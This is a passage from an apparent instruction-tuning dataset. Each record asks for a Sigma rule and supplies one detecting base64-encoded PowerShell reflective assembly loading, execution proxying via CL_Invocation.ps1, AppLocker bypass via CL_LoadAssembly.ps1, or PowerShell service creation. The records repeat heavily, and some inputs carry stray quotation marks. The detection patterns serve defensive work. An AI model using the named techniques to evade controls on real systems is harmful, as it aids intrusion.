Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwB\"zAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA 6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ oAOgAoACIATABvACIAKwAiAGEAZAAiACkA 6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ oAOgAoACIATABvAGEAIgArACIAZAAiACkA 6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA 6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ oAOgAoACcATABvACcAKwAnAGEAZAAnACkA 6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ oAOgAoACcATABvAGEAJwArACcAZAAnACkA 6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA 6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ oAOgAoACIATABvACIAKwAiAGEAZAAiACkA 6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ oAOgAoACIATABvAGEAIgArACIAZAAiACkA 6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA OgA6ACgAJwBMACcAK\"wAnAG8AYQBkACcAKQ\" oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA 6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ oAOgAoACcATABvACcAKwAnAGEAZAAnACkA 6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ oAOgAoACcATABvAGEAJwArACcAZAAnACkA 6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA 6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ oAOgAoACIATABvACIAKwAiAGEAZAAiACkA 6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ oAOgAoACIATABvAGEAIgArACIAZAAiACkA 6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA 6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ oAOgAoACcATABvACcAKwAnAGEAZAAnACkA 6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ oAOgAoACcATABvAGEAJwArACcAZAAnACkA 6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "SyncInvoke", "output": "title: Potential Process Execution Proxy Via CL_Invocation.ps1\nid: a0459f02-ac51-4c09-b511-b8c9203fc429\nstatus: test\ndescription: Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/\n    - https://twitter.com/bohops/status/948061991012327424\nauthor: Nasreddine Bencherchali (Nextron Systems), oscd.community, Natalia Shornikova\ndate: 2020-10-14\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains: 'SyncInvoke '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "SyncInvoke", "output": "title: Potential Process Execution Proxy Via CL_Invocation.ps1\nid: a0459f02-ac51-4c09-b511-b8c9203fc429\nstatus: test\ndescription: Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/\n    - https://twitter.com/bohops/status/948061991012327424\nauthor: Nasreddine Bencherchali (Nextron Systems), oscd.community, Natalia Shornikova\ndate: 2020-10-14\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains: 'SyncInvoke '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "SyncInvoke", "output": "title: Potential Process Execution Proxy Via CL_Invocation.ps1\nid: a0459f02-ac51-4c09-b511-b8c9203fc429\nstatus: test\ndescription: Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\"\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/\n    - https://twitter.com/bohops/status/948061991012327424\nauthor: Nasreddine Bencherchali (Nextron Systems), oscd.community, Natalia Shornikova\ndate: 2020-10-14\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains: 'SyncInvoke '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "LoadAssemblyFromPath LoadAssemblyFromNS", "output": "title: Assembly Loading Via CL_LoadAssembly.ps1\nid: c57872c7-614f-4d7f-a40d-b78c8df2d30d\nstatus: test\ndescription: Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls.\nreferences:\n    - https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/\n    - https://lolbas-project.github.io/lolbas/Scripts/CL_LoadAssembly/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-21\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains:\n            - 'LoadAssemblyFromPath '\n            - 'LoadAssemblyFromNS '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "LoadAssemblyFromPath LoadAssem\"blyFromNS\"", "output": "title: Assembly Loading Via CL_LoadAssembly.ps1\nid: c57872c7-614f-4d7f-a40d-b78c8df2d30d\nstatus: test\ndescription: Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls.\nreferences:\n    - https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/\n    - https://lolbas-project.github.io/lolbas/Scripts/CL_LoadAssembly/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-21\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains:\n            - 'LoadAssemblyFromPath '\n            - 'LoadAssemblyFromNS '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "LoadAssemblyFromPath LoadAssemblyFromNS", "output": "title: Assembly Loading Via CL_LoadAssembly.ps1\nid: c57872c7-614f-4d7f-a40d-b78c8df2d30d\nstatus: test\ndescription: Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls.\nreferences:\n    - https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/\n    - https://lolbas-project.github.io/lolbas/Scripts/CL_LoadAssembly/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-21\nmodified: 2023-08-17\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: As this function is usually called from within powershell, classical process creation even would not catch it. This will only catch inline calls via \"-Command\" or \"-ScriptBlock\" flags for example.\n        CommandLine|contains:\n            - 'LoadAssemblyFromPath '\n            - 'LoadAssemblyFromNS '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-Service -BinaryPathName", "output": "title: New Service Creation Using PowerShell\nid: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2\nrelated:\n    - id: 85ff530b-261d-48c6-a441-facaa2e81e48 # Using Sc.EXE\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using powershell.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-Service'\n            - '-BinaryPathName'\n    condition: selection\nfalsepositives:\n    - Legitimate 